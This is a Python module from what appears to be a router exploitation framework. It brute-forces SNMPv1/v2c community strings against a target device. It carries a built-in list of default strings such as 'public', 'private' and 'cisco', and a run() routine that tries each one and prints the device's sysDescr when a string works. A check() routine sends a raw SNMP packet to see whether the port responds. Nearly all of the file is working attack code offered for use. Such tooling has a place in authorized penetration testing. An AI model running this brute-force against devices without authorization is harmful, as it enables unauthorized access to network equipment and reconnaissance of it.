"""SNMP community string bruteforce.

Tests a list of community strings against an SNMP-enabled device.
Supports SNMPv1 and SNMPv2c. Uses pysnmp for protocol handling.

Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""

from __future__ import annotations

from typing import List

from routerxpl.core.exploit import *
from routerxpl.core.http.http_client import HTTPClient

__info__ = {
    "name": "SNMP Community String Bruteforce",
    "description": (
        "Tests a list of SNMP community strings against the target. "
        "Supports SNMPv1/v2c. Extracts sysDescr on success for device fingerprinting."
    ),
    "authors": ("André Henrique (@mrhenrike)",),
    "references": (
        "https://www.rapid7.com/db/modules/auxiliary/scanner/snmp/snmp_login/",
    ),
}

_DEFAULT_COMMUNITIES: List[str] = [
    "public", "private", "community", "admin", "manager",
    "monitor", "default", "cisco", "router", "switch",
    "secret", "password", "read", "write", "snmp",
    "network", "guest", "test", "internal", "access",
    "0", "1234", "cable-docsis", "ILMI",
]


class Exploit(HTTPClient):
    """SNMP community string bruteforce."""

    target     = OptIP("", "Target IPv4 address")
    port       = OptPort(161, "Target SNMP UDP port")
    wordlist   = OptString("", "Path to community string wordlist (empty = built-in list)")
    timeout    = OptPort(3, "UDP response timeout (seconds)")

    def _load_communities(self) -> List[str]:
        """Load community strings from wordlist or use defaults."""
        if self.wordlist:
            try:
                return [
                    line.strip() for line in open(self.wordlist)
                    if line.strip() and not line.startswith("#")
                ]
            except Exception as e:
                print_error(f"Could not load wordlist: {e} — using defaults")
        return _DEFAULT_COMMUNITIES

    def run(self) -> None:
        """Bruteforce SNMP community strings."""
        try:
            from pysnmp.hlapi import (
                CommunityData, ContextData, ObjectIdentity, ObjectType,
                SnmpEngine, UdpTransportTarget, getCmd,
            )
        except ImportError:
            print_error("pysnmp not installed — run: pip install pysnmp")
            return

        communities = self._load_communities()
        print_status(
            f"Testing {len(communities)} community strings against "
            f"{self.target}:{self.port}/udp..."
        )
        found = []
        for comm in communities:
            try:
                error_indication, error_status, _, var_binds = next(
                    getCmd(
                        SnmpEngine(),
                        CommunityData(comm, mpModel=1),
                        UdpTransportTarget(
                            (self.target, int(self.port)),
                            timeout=int(self.timeout),
                            retries=0,
                        ),
                        ContextData(),
                        ObjectType(ObjectIdentity("SNMPv2-MIB", "sysDescr", 0)),
                    )
                )
                if not error_indication and not error_status:
                    sys_descr = var_binds[0][1].prettyPrint() if var_binds else ""
                    print_success(f"VALID community: '{comm}'")
                    if sys_descr:
                        print_success(f"  sysDescr: {sys_descr[:150]}")
                    found.append(comm)
            except Exception:
                continue

        if not found:
            print_error(f"No valid community strings found ({len(communities)} tested)")

    def check(self) -> bool:
        """Check if SNMP port is responding."""
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(int(self.timeout))
        # Minimal SNMPv1 GetRequest for sysDescr with community "public"
        pkt = bytes.fromhex(
            "302602010004067075626c6963"
            "a01902040000000002010002010030"
            "0b300906052b0601020101050000"
        )
        try:
            sock.sendto(pkt, (self.target, int(self.port)))
            data, _ = sock.recvfrom(1024)
            if data:
                print_success("SNMP port responding")
                return True
        except socket.timeout:
            print_error("No response on UDP 161")
        except Exception as e:
            print_error(f"Check error: {e}")
        finally:
            sock.close()
        return False
